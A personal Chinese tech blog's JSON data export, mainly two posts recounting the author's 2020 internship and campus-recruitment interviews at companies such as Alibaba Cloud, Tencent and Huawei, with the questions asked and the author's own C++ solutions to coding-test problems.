{"meta":{"title":"知君的博客","subtitle":null,"description":null,"author":"知君","url":"https://liuyi12138.github.io","root":"/"},"pages":[{"title":"","date":"2021-02-23T06:34:31.941Z","updated":"2021-02-23T06:34:31.941Z","comments":false,"path":"categories/index.html","permalink":"https://liuyi12138.github.io/categories/index.html","excerpt":"","text":""},{"title":"网址收藏","date":"2018-06-17T04:23:25.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"webs/index.html","permalink":"https://liuyi12138.github.io/webs/index.html","excerpt":"","text":"博客收藏廖雪峰的官方网站 阮一峰的网络日志 泊哥的博客 宇哥的博客 zzy的博客 陈逸飞的博客 松哥的博客 邓天迈的博客 实用网址收藏Github LeetCode PTA 超级表格 石墨表格 慕课网 中国大学mooc 教程收藏hexo主题个性化教程 Linux终端游戏 Linux下配置Node环境变量 PS1应用之——修改linux终端命令行各字体颜色 Linux Shell脚本教程 图解安装CLion编写程序 PyCharm使用教程 HUST网址收藏HUST统一身份认证系统 HUST电子邮件系统 高校外语教学平台 好策读书 蓝墨云班课"},{"title":"","date":"2021-02-23T06:34:31.941Z","updated":"2021-02-23T06:34:31.941Z","comments":false,"path":"tags/index.html","permalink":"https://liuyi12138.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"秋招面试经历整理","slug":"秋招面试经历整理","date":"2020-10-19T07:09:16.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2020/10/19/秋招面试经历整理/","link":"","permalink":"https://liuyi12138.github.io/2020/10/19/秋招面试经历整理/","excerpt":"秋招共持续了四个月，总共投了19家公司，有几家挂在了不同的阶段，最后拿到了8家的offer，这段时间里面了几十场面试，大多数面试的问题都懒得做记载了，在此只记录一下大概的问题走向、一些面试常见的问题以及一丢丢面试技巧供大家参考。","text":"秋招共持续了四个月，总共投了19家公司，有几家挂在了不同的阶段，最后拿到了8家的offer，这段时间里面了几十场面试，大多数面试的问题都懒得做记载了，在此只记录一下大概的问题走向、一些面试常见的问题以及一丢丢面试技巧供大家参考。 秋招战况投递统计统计了一下，秋招共向以下19个公司投递了简历，共拿了8个offer 一线大厂：字节、百度、腾讯、拼多多 准一线大厂：大疆、华为、快手、美团、图森未来、京东、猿辅导 二线小厂：TP-Link、招银科技、深信服、b站 国企：中电29所、国电南自、农行 外企：shopee(算半个外企吧) 面试情况挂在简历筛选的公司 只招与需求极度相符的人：b站、图森未来 要求没达到：农行(英语六级没过) 未知理由：京东(听说面试都挺迷的) 挂在机试的公司机试一般有性格评测和笔试两部分，性格评测主要是性格测试题+阅读理解+小学奥数+找规律+图表题，大概30min完成。 性格评测挂了：拼多多(忘做了)、华为实习生(挂了被捞了) 笔试挂了：大疆(应该是和简历综合评判之后觉得不符合) 挂在面试的公司 实习生面试挂太多了：腾讯(之前实习生面试挂了三次，估计评分很低) 只招与需求极度相符的人：shopee(后端岗疯狂问用过哪些后端框架，不问基础和C++) 面试累了，鸽了面试：快手、猿辅导 自己拒了：中电29所(研究方向不符) 收割offer TP-Link：6月就开始秋招提前批，公司有985情结，面试基本就聊天，很容易就过了，在北京工资不高，并且无加班费 字节：典型的挂了又捞，捞了有挂，经历了安全岗简历挂和一面挂，被广告部门捞起来，技术面三轮+hr面拿offer 深信服：机缘巧合投的大牛批，一面很水，二面是正常技术面，三面主管面很契合项目方向，拿了ssp 招银科技：调过电话面(摸底)，两轮技术面，问的东西都很浅，范围还比较广 国电南自：一面技术面，比较简单，三天发offer，本科生薪资低，还需要出差 百度：无人车部门两面挂，语音识别部门三轮技术面+一轮主管面，跟字节类似，主管画技术饼 华为(待安排)：实习生过了所以免笔试，一轮技术面+主管面，基本聊天，但offer下发周期长 美团点评(待安排)：三轮技术面不是很难，hr面后两个月不给结果，估计是hc少，池子深 面试总结由于大部分公司都是投的提前批，所以很少有笔试，面试一般是2-5轮，摸底面+技术面+主管面+hr面，侧重点各不相同。 摸底面摸底面也就是很多公司的电话面，比如招银科技、国电南自，一般时间不会很长，大概在10-20分钟之间，主要是自我介绍+项目经历简介，有的会有一些常见的基础题，比如TCP为什么三次握手这种。只要有一定的准备，电话面基本都不会挂，有的公司如果你简历or笔试表现好会跳过这个环节。 技术面技术面是面试流程中的核心环节，主要考察我们对计算机基础知识的掌握程度，一般会涉及计网、操作系统/Linux、数据库，编程语言(c++/Java等)，部分会问到编译原理这种比较偏向计算机专业的问题。 一般公司的技术面为2-3轮，主要模式都大概相似，开始自我介绍，紧接着问一些基础知识相关的问题or项目相关的技术问题，最后是1-2道现场编程题，也有的公司会先上来让你写题，后续根据你的表现来决定问什么问题。 主管面并不是所有公司都有主管面，一般是部门直招or你前面面试表现较好，可能有sp的情况下才会有主管面试，一般主管的级别越高就说明你的评级越高。 主管面并不会拘泥于具体的技术问题，在你的自我介绍后，主管喜欢针对项目进行提问，主要是考察你对自己所做项目的掌握程度，并且很多时候会问到一些与人沟通相处相关的问题，比如如果组员之间出现了意见分歧你们会怎么办，另一方面，你印象最深的一次项目经历也是常问的问题，这些都是需要提前准备好的。 在主管面的时候我会更多的讲一些自己的学生工作，领导项目or组织活动的经历，当然这种经历最好是与技术挂钩的。以及与主管讨论编程规范，自动化测试、软件工程、测试驱动开发，或者项目管理等问题也是正中他们要害的，并且一定要多问，一般主管们很喜欢给新人讲这些，给他们机会，装作很感兴趣的样子。 hr面hr面一般就直接确认offer或者谈薪了，极少见到hr面还刷人的(听说京东和阿里会)，一般hr会问你一些基本的家庭和学习情况，以及你现在拿了哪些offer。 在hr面自己也可以问一问公司的一些情况，比如薪资结构，五险一金，加班情况，加班费计算，升职加薪的规章制度，年假安排等，这些都是需要提前了解并且纳入offer考虑范围的，不过薪资才是硬道理。 知识点总结实际上在实习生阶段已经整理了很多被问到的问题以及部分问题写了一下自己的解答(还有很大一部分坑没填呢)，秋招阶段感觉其实万变不离其宗，问来问去都是那么几个问题，所以就没做记录了。在此依据记忆在几个主要的方向写出几个最常见的问题吧。 计算机网络 简述从输入网址到浏览器显示的过程 TCP为什么是三次握手四次挥手 TCP如何保障数据包有效 HTTPS和HTTP的区别 操作系统 进程与线程的区别 堆与栈的区别 内核态和用户态的划分与切换 虚拟地址怎么映射到物理地址 简述IO多路复用 简述进程通信的各种方法 数据库 简述关系型数据库与菲关系形数据库的区别与联系 简述数据库的事务 编程语言(C++) C++多态及其实现 C++11的新特性 右值引用 vector与list、map与unordered_map比较 面经总结 个人面经集合 能看的大概也就下面几篇了： 实习生面试经历整理 TCP详解 网址访问过程详解 操作系统问题整理 C++相关知识点梳理 个人感受 我感觉在技术面阶段实际上主要不在于你是不是都会，更好的实际上是你在某一两个问题上了解的特别详细，或者有项目经历，能跟面试官聊很久，这样在面试中就可以把面试官带到自己的点上，比如在面试官问网址访问过程的时候，我会讲的特别详细，并且把HTTPS和HTTP留在最后，通过HTTPS延伸到逆向工程中的一些密码学问题或者延伸到中间人攻击，这些常常会让面试官眼前一亮。 另外我感觉问面试官对自己的评价or自己哪些位置做的不好这种问题还是谨慎，如果自己表现得很完美就可以问问，不然面试官也不可能一直夸你，一般只会简单夸一下，然后绞尽脑汁想一想你有哪些位置做的不好，这就无形中提醒了他你的缺点。","categories":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/categories/面经/"}],"tags":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/tags/面经/"}]},{"title":"实习生面试经历整理","slug":"实习生面试经历整理","date":"2020-08-19T13:48:16.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2020/08/19/实习生面试经历整理/","link":"","permalink":"https://liuyi12138.github.io/2020/08/19/实习生面试经历整理/","excerpt":"收录一下实习生期间阿里云、腾讯、华为、快手、拼多多五个公司的面经，当时没有做太多准备，只拿到了华为的offer，但是对整个面试的流程以及可能涉及到的问题有了初步的了解，便于自己之后针对性学习。","text":"收录一下实习生期间阿里云、腾讯、华为、快手、拼多多五个公司的面经，当时没有做太多准备，只拿到了华为的offer，但是对整个面试的流程以及可能涉及到的问题有了初步的了解，便于自己之后针对性学习。 阿里云时间安排 2020/4/1 上午，人才测评 2020/4/1 下午，笔试 2020/4/2 下午，一面 人才测评这个人才测评的考题就比较奇葩了，与技术无关，目前也不知道有啥影响，考试形式为全是选择题，分为几个不同的部分，前三个部分每题会有限时，60s左右一提，最后一部分不限时，整个过程大概50min，实际上30min左右可完成 10题阅读理解，给一段话，选出其中心思想 10题图表信息提取，给一段话加一张表，提取需要的信息，需要使用计算器 10题找规律，可以参考小学做的那种找图形规律的题 98题人格测试，应该是用来测试人的性格吧 笔试阿里的笔试总共就两道题，每题50分，用的是牛客网，期间录屏+开摄像头+手机锁，基本杜绝作弊的可能（但录屏只能锁一块屏幕，拓展屏貌似不受影响） 听说无论笔试情况如何都能面试，这个暂时不收很清楚，反正我是一道也没写出来2333 我凭借记忆记录一下笔试题，可能会有偏差 T1、翻转序列有一个只包含有0和1的序列，每次可以选择翻转一个数字，此时它两边的数字也会跟着翻转，如果选择翻转index为0或者string.size()-1的数字则只会影响到它旁边的一个数。需要将所有的数字都翻转为0，输出最少的翻转次数 我的思路我拿到这个题的想法就是每次遇到“11”序列则翻转，保证前面已经翻转的数字都为0，但无奈写完之后发现有“10101”这种序列， 查了好久才发现，最后没写出来。 标准思路解法一：贪心 对数列进行遍历每次遇到0则从他的下一位开始翻转，这样就刚好影响到它本身 当对(0,string.size()-2)区间内的数字进行遍历完成后，如果最后一位为1则无法成功翻转，否则输出最少的翻转次数 12345678910111213int count = 0;for(int i = 0; i &lt; s.size()-1; ++i)&#123; if(s[i] == 1)&#123; s[i] ^= 1; //翻转 s[i+1] ^= 1; if(i + 2 &lt; s.size()) //判断是否为倒数第二位 s[i+2] ^= 1; count++; &#125;&#125;if(s[s.size()-1]) return -1;return count; 解法二：滑动窗口可以考虑不做实际的翻转，只记录该位被翻转了多少次，而每一位是由周围2位影响的，所以需要维护一个队列来记录目前哪些位被翻转 123456789101112131415161718int count = 0;queue&lt;int&gt; q;for(int i = 0; i &lt; s.size(), ++i)&#123; while(!q.empty() &amp;&amp; q.front() + 2 &lt;= i) q.pop(); //剔除已经无影响的翻转 if(q.size() % 2 != A[i])&#123; //判断是否需要翻转 count++; q.push(i); &#125;&#125;while(!q.empty())&#123; if(q.front() == s.size()-1)&#123; //最后一位还需要翻转则无法成功翻转 free(q); return -1; &#125; q.pop();&#125;return count; 参考资料Leetcode T995 K 连续位的最小翻转次数 T2、射箭打怪这个题我只简单的看了一眼，无法保证完全正确输入m与n，表示一共有m只箭与n个怪，并会给出每一只怪的体力值，每一只箭的攻击力和价钱，输出杀死全部怪的最少花钱数 我的思路笔试的时候只是瞟了一眼，没有做，后来又想了一下，有一个大概的思路：用一个结构体存储箭，把箭按价钱排序，然后对每个怪遍历箭的list去寻找可以杀死它的箭并记录下价格，不确定题目是有放回还是无放回，对应的是用完的箭是否删除。不知道对不对，先写着，感觉如果还有面试应该会被问到。 一面笔试第二天就安排了面试效率还是很高的，不像腾讯，都要一周了还没开始面 面试主要分为知识点考察和现场编程两个环节，知识点考察是通过电话来进行的，貌似是阿里那边有一个电话转接的软件，感觉通话质量一般；现场编程是通过邮箱发过来的链接进入，面试官那边可以看到你这边写的代码。整个面试过程中知识点考察大概1h左右，现场编程30min吧，我这边由于网络原因所以中间花的时间比较多。 项目经历面试官没有给自我介绍的时间，上来就直接问了项目，主要问题如下： 网安 简单介绍一下你们这个项目 你们项目中用到了DPDK你了解吗？ DPDK和一般的从网卡截取流量有什么不同？ 你们项目中为什么要用深度学习，这个和网络安全有什么关系吗？ 你在你们这个项目中有遇到什么难以去解决的问题吗？ 启亦 在启亦项目中用到实时计算(我说的这个实时计算跟你想的貌似不大一样啊) 互联网中实时计算用到了哪些技术？(真不会了) 面试官都问的网安项目，瞬间摸清了我啥都不会的事实 操作系统 操作系统是如何进行进程切换的，请进程A切换到进程B是怎么样一个流程？ 操作系统是如何把进行从用户态切换到内存态？(软中断和硬中断) 操作系统是在进行进程切换时的上下文切换是什么样的操作？ 一个进程在切换的时候会保存哪些资源？ 在Linux系统下怎么去创建一个新的进程？(fork) fork在复制的时候会拷贝原进程的数据嘛(copy-on-write) 写过多线程代码吗？(开始尴尬) 多线程主要会遇到什么问题？(资源抢夺-&gt;死锁) 死锁有什么解决机制？ 你了解一个进程在地址空间中会划分为什么区域吗？(往PE文件加载上去扯) 你了解数据块中的堆内存和栈内存吗？ malloc分配的内存在哪？(自己挖坑) 内存在堆里，变量存在堆里面，指向那块内存的指针在栈里面 你了解malloc是怎么管理内存的吗？(假装不知道，先埋伏他一手) 怎么去处理内存碎片的问题？ 这种处理方式有什么问题？ 你了解虚拟内存怎么映射到物理内存的吗？ 你有过socket编程的经验吗？(再次没写过) 怎么对并发请求进行处理？ 你有了解IO复用的概念吗？(这个确实忘了) Linux 你了解Linux系统的基本操作吗？ 不了解，此路不通 编译原理 你了解静态链接和动态链接的区别吗？ 简要叙述一下一个C语言程序编译生成机器码的过程 编译整个过程有哪些具体的阶段？ 你了解词法分析语法分析吗 计算机网络 从输入网址到浏览器显示是怎样的一个过程 DNS -&gt; ARP -&gt; HTTP -&gt; HTTPS(再埋伏一手，把对称加密和非对称加密简单描述一下) DNS协议底层是用什么协议(原来是问的传输层，这波亏了) 请求DNS服务器的过程是怎样的？ 你了解Cookie吗？(开始扯自己的开发经历-&gt;MyBlog) 你了解HTTPS加密的整个过程？ 终于来了！从自己对dewdrop的分析开始引入对HTTPS的了解，夹带私货成功 为什么HTTPS不直接用非对称加密，而要先用非对称加密再用对称加密？ 非对称加密的公钥存在哪，怎么去拿？(签名和证书分不清了23333) 你了解证书链的概念吗？(扯信任链，但实际上我不清楚) 数据库 数据库你用过什么数据库？(用的多的是MongoDB) 对比MongoDB和MySQL(关系型数据库和非关系型数据库) MySQL不使用外键，自己维护关系的情况下和MongoDB有什么区别？(我觉得貌似确实没区别啊) 你了解数据库的索引吗？ ObjectiveID就相当于主键 你了解给一个属性加索引吗？(我？？？) 你了解数据库的事务吗？ 果断我没学过数据库，下一个 Web React框架解决了什么问题？ Vue跟自己手写js有什么区别？ 你了解过React Native框架吗？ 编程语言C++ 你用过C++的智能指针吗？ 你了解智能指针的实现原理吗？ 你了解C++的多态是怎么实现的吗？ JAVA 你了解JAVA的GC机制吗？ 其他 你可以分享一下你最近看的一本技术书籍吗？ 话不多说《Metasploit渗透测试魔鬼训练营》，被评价接触范围广 你对未来的规划是怎样的？是想直接工作还是读研？ 工作 你有什么问题想问我？(标准结局) 先扯一下对公司的各种问题 我想知道一下你对我这次面试的评价(这个就不写了) 手撕代码写代码是用的阿里伯乐在线评测系统，代码不用编译，就在白板上手写，没有自动补全，面试完后会把你的代码给你发过来，还挺贴心 题目不是很难，感觉大多是考察代码规范以及思路 之前在LeetCode上写过，基本是原题，LeetCode T8 字符串转换整数(atoi) 这题我自己在大一暑假写过刷题笔记/) 这次现场写的代码如下，自己面试后直接贴到LeetCode上去测过，直接AC了也是很奇妙 1234567891011121314151617181920212223242526272829303132333435363738394041class Solution &#123;public: int myAtoi(string s) &#123; if(s.size() == 0) return 0; int i = 0; while(i &lt; s.size() &amp;&amp; s[i] == ' ') ++i; if(i &gt;= s.size()) return 0; int exit = 0; int flag = 0; if(s[i] == '+')&#123; ++i; exit = 1; &#125; if(!exit &amp;&amp; s[i] == '-')&#123; flag = 1; ++i; &#125; long long res = 0; while(i &lt; s.size())&#123; if(s[i] &lt; '0' || s[i] &gt; '9') break; res *= 10; res += (s[i] - '0'); if(res &gt;= INT_MAX) break; ++i; &#125; if(flag)&#123; res = 0 - res; if(res &lt;= INT_MIN) return INT_MIN; &#125; if(res &gt;= INT_MAX) return INT_MAX; int ans = int(res); return ans; &#125;&#125;; 腾讯时间安排 2020/4/3 下午，后台开发一面 2020/4/3 晚上，后台开发二面 2020/4/14 上午，数据分析一面 2020/4/26 晚上，正式批笔试 2020/5/18 下午，正式批一面 后台开发一面腾讯的一面很简单干脆，使用的是牛客网的在线面试功能，首先面试官给了我6道题，限时50min，没有屏幕共享，所以可以上网搜索搜索2333，不过我还是自己写的；写完题后简单讨论了一下思路，然后问了操作系统，计算机网络的一些基础知识，项目经历说的很多。 由于忘了录音，就简单记录一下我记得的部分。 项目经历 简要介绍你们的项目(网安) 你们这个项目中为什么要用到逆向分析？ 操作系统 虚拟地址如何映射到物理地址？ 你了解IO复用吗？ 有没有写过并发程序？ Linux 你了解select和epoch的区别吗？ 计算机网络 你了解HTTPS的连接过程吗？ 编程语言(C++) 你了解C++的多态是怎么实现的吗？ 你知道C++中为什么要extern C吗？ 其他 你有什么问题想问我？(标准结局) 问一下公司的加班情况以及技术氛围 我想知道一下你对我这次面试的评价(不评价，会推给下一个面试官) 题目部分1、找出其中不含有重复字符的最长连续子串的长度123456789101112131415161718192021int lengthOfLongestSubstring(string s)&#123; unordered_map&lt;char, bool&gt; mMap; int fast = 0; int slow = 0; int maxLen = 0; while(fast &lt; s.size())&#123; if(mMap[s[fast]])&#123; mMap[s[slow]] = false; slow++; &#125; else&#123; if(fast - slow &gt; maxLen) maxLen = fast - slow; mMap[s[fast]] = true; fast++; &#125; &#125; return maxLen + 1;&#125;` 2、有一个字符串列表，从中找出按字典序最大和最小的串。123456789101112void find(vector&lt;string&gt; strlist, string&amp; strmin, string&amp; strmax)&#123; if(strlist.size() == 0) return; strmin = strlist[0]; strmax = strlist[0]; for(int i = 1; i &lt; strlist.size(); ++i)&#123; if(strlist[i] &lt; strmin) strmin = strlist[i]; if(strlist[i] &gt; strmax) strmax = strlist[i]; &#125;&#125; 3、从有序链表中去除重复的元素 (1, 1, 3, 3, 3, 5, 5, 5, 9, 9, 9, 9) -&gt; (1, 3, 5, 9) 这个题没有看到有序。。。 1234567891011121314151617181920struct LinkNode &#123;int val;struct LinkNode * next;&#125;;void remove( LinkNode * head )&#123; if(!head) return; unordered_map&lt;int, bool&gt; mMap; while(head &amp;&amp; head-&gt;next)&#123; if(mMap[head-&gt;next-&gt;val])&#123; struct LinkNode* temp = head-&gt;next; head-&gt;next = head-&gt;next-&gt;next; free(temp); &#125; else&#123; mMap[head-&gt;next-&gt;val] = true; &#125; head = head-&gt;next; &#125;&#125; 4、有一个二叉树，每个节点的值是一个整数。写一个函数，判断这颗树中是否存在从根到叶子节点的一个路径，这个路径上所有节点之和为某一个值。存在返回1，否则返回0。12345678910111213struct TreeNode &#123; int value; struct TreeNode * left, * right;&#125;;int haspath(struct TreeNode * root, int value)&#123; if(!root) return (value == 0); if(haspath(root-&gt;left, (value - root-&gt;value))) return 1; if(haspath(root-&gt;right, (value - root-&gt;value))) return 1; return 0;&#125; 5、算一下从1到N中，“1” 在每个数出现的次数之和 这题当时没有想出一个很好的想法 参考Leetcode 面试题43. 1～n整数中1出现的次数 6、(逻辑题)费南德的金币游戏： 费南德和你抢到20个银币和一个金币； 你们的分赃规则： a. 俩人轮流拿，每次至少拿一个最多不能超过四个(可以等于四个); b. 金币和银币不能混合拿，金币最后拿; 如果由你先拿，怎么才可以拿到那个金币？ 我的思路是要让对方拿到第20个银币，就得自己先拿到第19个银币，两个人轮流拿，可以控制周期为5，控制每轮两个人拿的银币数目为5个，因此19-&gt;14-&gt;9-&gt;4，所以最开始需要拿4个银币。 后台开发二面u1s1，这二面来得太快了，tx效率…. 二面是项目面，上来让我介绍项目，balabala把自己的自我介绍念了一遍，感觉还ok。然后整个过程面试官就问了一个问题，你在项目中遇到了哪些难点，是怎么解决的？ 像以前一样把逆向讲了一遍，ok，fine他不懂，Wannacry也不知道，然后问我其他项目还有没有，但我还没开始编。。。然后就扯了一下计网课设，然后就到标准结局了，他表示如果过了还有一个技术面，具体方向不告诉我。。。感觉应该是tx难点 所以，大家一定要先编好故事.jpg ——来自半小时结束二面的教训 数据分析一面之前的后台开发二面凉了，后来又被腾讯云捞到了技术分析岗，一面面试官迟到一小时，非技术面，很迷。 大致面试流程和提问如下： 个人介绍(项目介绍) 你在整个大学生活中项目、学习、生活的占比是怎么样的？ 你自己的职业规划是怎么样的？ 你对在公司的工作环境有没有什么要求？ 你接触过哪些编程语言，可以举出最熟悉的两门语言吗？ 有没有接触过什么开源项目？ 你在学校的加权成绩怎么样？ 你个人觉得自己的闪光点有哪些？ 能举例证明自己的学习能力很强吗？ 你对我还有什么问题吗(标准结局)？ 问对方部门的情况 问对方对自己的评价 正式批笔试不得不说，腾讯的笔试是最近几个公司里面最像笔试的，其他的都整的像ACM笔试一样，一共五道题，AC了3.6道，感觉还okk T1 模拟队列有一说一，C++有队列哦，所以对输入的字符串进行处理，然后调用队列就好了，基本上签到题。 T2 求点集的最短距离题目如下 感觉自己只会暴力，dalao说的方法都听不懂hhhhh T3 翻牌游戏看到题目就不明觉厉，所以一直都没写，有人说用dfs，咱也不知道，先放着，有时间来填坑 T4 用两个栈实现队列比较经典的一道题，不知道有没有设置时间复杂度，代码可以写得很优雅。123456789101112131415161718192021222324252627282930313233343536373839404142434445int main()&#123; int n; cin &gt;&gt; n; stack&lt;int&gt; s1; stack&lt;int&gt; s2; int k; int now = 0; for(int i = 0; i &lt; n; ++i)&#123; string s; cin &gt;&gt; s; if(s == \"add\")&#123; cin &gt;&gt; k; if(now == 1)&#123; while(!s2.empty())&#123; s1.push(s2.top()); s2.pop(); &#125; now = 0; &#125; s1.push(k); &#125; else if(s == \"peek\")&#123; if(now == 0)&#123; while(!s1.empty())&#123; s2.push(s1.top()); s1.pop(); &#125; now = 1; &#125; cout &lt;&lt; s2.top() &lt;&lt; endl; &#125; else if(s == \"poll\")&#123; if(now == 0)&#123; while(!s1.empty())&#123; s2.push(s1.top()); s1.pop(); &#125; now = 1; &#125; s2.pop(); &#125; &#125; return 0;&#125; T5 一道数学题 实际上求个log确定层数，然后移位就好了 需要注意的是大数问题，用long long即可 1234567891011121314int main()&#123; int n,x,k,t; cin &gt;&gt; n; for(int i = 0; i &lt; n; ++i)&#123; cin &gt;&gt; x &gt;&gt; k; t = log(x) / log(2); if(t &lt; k) cout &lt;&lt; -1 &lt;&lt; endl; else&#123; cout &lt;&lt; int(x/pow(2, t-k+1)) &lt;&lt; endl; &#125; &#125; return 0;&#125; 正式批一面直接被锤爆，根本没问项目，直接从网络安全，计网，操作系统，C++，数据库，分布式，数据结构等方面把我锤了，锤得稀巴烂，近期不投不面了，有阴影。 感觉准备不充分，太久没面技术面了，自我技术都说的磕磕碰碰，他也不咋问项目，直接开捶我。 网络安全 你了解Web安全吗，能说一下相关的攻击方式及防御机制吗？ 你能简单说一下DDos攻击吗？ 你了解对称加密吗，能说一下你知道的对称加密算法吗（这里还提到了某个hash算法，没听说过）？ 计网 你知道tcp包里的校验和有什么用？是怎么实现的？ 你知道tcp为什么要三次握手，而不是两次？ 你知道tcp过程中有哪保障数据包数据有效的操作？ 操作系统 你知道哪些进线程通信的方法？ 你知道哪些高性能IO的方法？ C++ 你知道C++11有哪些新特性吗？ 你知道右值引用解决了什么问题吗？ 数据库 你平时用过哪些数据库？ 你知道mongodb的高并发数据啥啥啥是怎么实现的吗？ 分布式 你有接触过哪些组件吗（举的例子完全不知道）？ 你有接触过哪些分布式的架构？ 你知道微服务吗？ 数据结构 你了解红黑树吗？B树B+树呢？ 最后灵魂发问，你哪个学院的，没学过这些吗？对不起了大家，给种子班丢脸了，要好好复习基础了。 华为时间安排 2020/4/22 晚上 笔试 2020/4/23 晚上 性格评测 2020/5/14 下午 技术面 2020/5/15 上午 部门主管面 笔试华为的笔试总共2h，三道题，第一道是签到题，后两道都有一定难度(其实并不)，和阿里一样是用的牛客的平台，没有截屏，就凭记忆简单记录一下 T1、输出数字字符给定一个随机的字符串，从小到大输出其中的数字字符，不考虑小数点和负数。 有一说一，这个题叙述的就有问题，我一想怎么可能是只输出字符，那也太简单了，只要维护一个长度为10的数组不就好了？然后果断理解为把连续的数字字符识别为同一个数字。 大概15-20min写完发现一直过不了，调了半天bug，最后还是改成了那个简单的理解，就过了。这道题基本就是签到题了，在这坑了半小时是真的难受。 T2、解析字符串给定一系列的报文字符串，都是16进制数，每一段报文以0x5a开头与结尾，报文中如果有0x5a就转译为0x5b 0xba，报文中如果有0x5b就转译为0x5b 0xbb，每一段报文的结尾前一个字节是报文长度，报文与报文衔接处只有一个0x5a，给定一段报文，提取其中的正确的报文段进行输出 这个题除了麻烦真的没啥亮点，于是乎我写了下面一版代码，但只通过了81%的case，也不知道为啥。。。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;vector&gt;#include &lt;iomanip&gt;using namespace std;int main()&#123; vector&lt;int&gt; nums; vector&lt;int&gt; apos; vector&lt;int&gt; bapos; vector&lt;int&gt; bbpos; int now, i, j, k; int cou = 0; while(cin &gt;&gt; hex &gt;&gt; now)&#123; nums.push_back(now); if(now == 0x5a)&#123; apos.push_back(cou); &#125; cou++; if(getchar() == '\\n') break; &#125; for(i = 0; i &lt; nums.size()-1; ++i)&#123; if(nums[i] == 0x5b &amp;&amp; nums[i+1] == 0xbb)&#123; bbpos.push_back(i); &#125; if(nums[i] == 0x5b &amp;&amp; nums[i+1] == 0xba)&#123; bapos.push_back(i); &#125; &#125; int unlen = 0; int start = 0; int flag = 0; for(i = 1; i &lt; apos.size(); ++i)&#123; for(j = 0; j &lt; bapos.size(); ++j)&#123; if(bapos[j] &gt; apos[start] &amp;&amp; bapos[j] &lt;= apos[i]) unlen += 1; &#125; for(j = 0; j &lt; bbpos.size(); ++j)&#123; if(bbpos[j] &gt; apos[start] &amp;&amp; bbpos[j] &lt;= apos[i]) unlen += 1; &#125; if(apos[i] - apos[start] == unlen + nums[apos[i]-1] + 2)&#123; for(k = apos[start]; k &lt; apos[i]; ++k)&#123; cout &lt;&lt; hex &lt;&lt; setfill('0') &lt;&lt; setw(2) &lt;&lt; nums[k] &lt;&lt; \" \"; flag = 1; &#125; &#125; start = i; unlen = 0; &#125; if(flag) cout &lt;&lt; hex &lt;&lt; setfill('0') &lt;&lt; setw(2) &lt;&lt; 0x5a &lt;&lt; \" \"; return 0; //5a 12 5b ba 34 5b bb 88 05 5a 75 cd bb 62 5a 34 cd 78 cc da fb 06 5a&#125; T3、数组划分给定一段长度为m的数组，需要把它划分为k段，每段的和为S(n)，要使得所有的子数组中的S(n)的最大值最小，如果有多种划分方法，应该使S(1)尽量大，依次类推到S(2)、S(3)… 我拿到这个题的第一想法就是算出其平均值，然后每次划分出最接近其平均值的一个数组，然后再计算平均值，继续划分。这个方法通过了80%的case。 因为是先做的T3，所以发现无法全部通过就去做T2了，也无法全部通过，直到最后30s发现了T3我的算法的问题在于可能会出现最终划分出的子数组小于k的情况，比如：1234567m = 9, k = 9;1 2 3 4 5 6 7 8 9需要划分为9段，显然答案是1 / 2 / 3 / 4 / 5 / 6 / 7 / 8 / 9但我的算法会先算出每一段的均值大概是6.1所以会划分出1 2 3 / 4 / 5 / 6 / 7 / 8 / 9 在网上找到最大值最小化问题的思路，此题是最小值最大化，理论上应该是等价的，都是要求把数组均分，细微操作上有些许不同。 二分法解决最大值最小化问题 二分法解决最大值最小的问题或者最小值最大的问题思路都是相同的，即无论是最大值最小化还是最小值最大化，其结果的范围都在[数组最大值，数组和]这个范围内，并且以这个为界限一侧可以划分，另一侧无法划分，因此可以使用二分法来拟合。 其实现上区别在于求最大值最小化的时候，当sum&gt;target时在此元素后进行划分，而求最小值最大化的时候是在此元素前进行划分。 技术面华为的技术面感觉就是其他公司的一面二面结合，用的是zoom，会开摄像头。先自我介绍问项目，然后聊了一会，之后问了几个基础知识点，再然后写了一题，最后介绍自己的部门。 自我介绍的时候说了项目介绍，然后对方对网安项目很感兴趣，让我介绍，最后他才说自己是做网安的，drl，班门弄斧，并且问了如果进了华为，开发岗和安全岗选哪一个，啊这，简直送命题，最后表示更倾向于开发岗，如果有培养计划可以考虑安全岗。 知识点的话就问了一下C++，真就入门水平的问题。。。虽然语言组织也不是特别好 深拷贝和浅拷贝有什么区别 字符串操作有哪些 链表和数组的区别和应用场景 写代码写了个找字符串最长前缀的题，Leetcode原题，还是Easy…，几分钟就写完了，然后开共享讲了一下思路。123456789101112131415161718192021222324string longgestCommonPrefix(vector&lt;string&gt;&amp; strs)&#123; if(strs.size() == 0) return \"\"; if(strs.size() == 1) strs[0]; string res = \"\"; char c = ' '; for(int i = 0; i &lt; strs[0].size(); ++i)&#123; c = strs[0][i]; for(int j = 1; j &lt; strs.size(); ++j)&#123; if(strs[j][i] != c) return res; &#125; res += c; &#125; return res;&#125;int main()&#123; vector&lt;string&gt; strs1 = &#123;\"flowers\", \"flflflf\", \"fl\"&#125;; vector&lt;string&gt; strs2 = &#123;\"abc\", \"bca\", \"cba\"&#125;; vector&lt;string&gt; strs3; vector&lt;string&gt; strs4 = &#123;\"abcd\"&#125;; cout &lt;&lt; longgestCommonPrefix(strs1); return 0;&#125; 最后就是标准结局了，最后问对我的评价的时候就说都挺好，目前没啥问题，让我过了，本来说下午还有一轮技术面，结果一查直接部门主管面了hhhhh。 部门主管面感觉这个部门主管面就相当于leader面+hr面了，挺友好的，主要是在宏观上问问项目和技术。主要就分自我介绍然后他提问，接着反问两个部分 自我介绍他给了2分钟时间，就把之前的自我介绍里面关于技术的都删了，然后主要问了几个问题： 你一般怎么提升自己的代码质量 能讲一下你对TDD的理解嘛 能讲一下你对敏捷开发的理解嘛 主要还是根据自我介绍进行提问吧，我感觉这几个点比较好，很符合面试官的期望。 然后是给我一个机会反问一个问题，问了一个比较宽泛 的问题： 你们的团队这么大，那在管理方面有没有什么好方法？然后他一个人说了好久，主要是什么高内聚低耦合啊，模块分离啊，然后他扯到了代码重构 